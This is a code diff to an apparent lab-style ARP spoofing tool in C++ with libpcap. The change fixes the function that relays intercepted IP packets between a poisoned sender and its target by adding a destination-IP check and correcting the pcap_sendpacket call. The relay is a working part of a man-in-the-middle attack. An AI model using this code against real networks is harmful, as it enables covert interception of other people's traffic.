@@ -12,7 +12,8 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "arpspoof.h"
-#include "dumpcode.h"
+//#include "dumpcode.h"
+
 #pragma pack(push, 1)
 struct EthArpPacket {
     EthHdr eth_;
@@ -174,23 +175,24 @@ void spoofARP(pcap_t* handle, const addressInfo &myAddressInfo){
         if(ethPacket->eth_.type_ == htons(EthHdr::Ip4)){                         //relay IP packet   
             Mac &dmac = ethPacket->eth_.dmac_;
             Mac &smac = ethPacket->eth_.smac_;
+            Ip  destIp(ntohl(*((uint32_t*)(packet + ETHER_HDR_LEN + 16))));
 
             for (int i = 0; i<myAddressInfo.targetPairs.size(); i++){
                 const Mac &senderMac = myAddressInfo.arpCache.find(myAddressInfo.targetPairs[i].first)->second;
 
-                if((dmac.operator==(myAddressInfo.myMac)) && (smac.operator==(senderMac))){      //sender => target Ip packet 
+                if((dmac.operator==(myAddressInfo.myMac)) && (smac.operator==(senderMac))   //sender => target Ip packet
+                    && (destIp.operator==(myAddressInfo.targetPairs_IP_object[i].second))){       
                     printf("Relaying %d bytes packet: sender%d - %s => target%d - %s\n",
-                        header->caplen, i,myAddressInfo.targetPairs[i].first,i,myAddressInfo.targetPairs[i].second);
+                        header->caplen, i, myAddressInfo.targetPairs[i].first, i, myAddressInfo.targetPairs[i].second);
 
                     relayPacket = (u_char*)malloc(header->caplen);
                     memcpy(relayPacket, packet, header->caplen);
 
                     ((EthHdr*)relayPacket)->smac_ = myAddressInfo.myMac;
                     ((EthHdr*)relayPacket)->dmac_ = myAddressInfo.arpCache.find(myAddressInfo.targetPairs[i].second)->second;
-                    dumpcode(relayPacket,header->caplen);
-                    //exit(0);
-                    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relayPacket), header->caplen);
-                    printf("send result %d\n",res);
+                    //dumpcode(relayPacket,header->caplen);
+
+                    res = pcap_sendpacket(handle, relayPacket, header->caplen);
                     if (res != 0) {
                         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                     }
